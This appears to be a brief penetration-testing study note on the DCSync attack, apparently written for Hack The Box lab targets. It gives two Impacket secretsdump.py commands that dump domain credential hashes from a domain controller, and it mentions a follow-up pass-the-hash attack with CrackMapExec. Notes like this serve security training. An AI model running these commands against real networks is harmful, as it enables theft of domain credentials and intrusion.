
DCSync attack
```
./secretsdump.py htb.local/user:password@ipadd > outputfile
```

run a passthehash attack with [[Crackmapexec]]


```shell-session
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

```
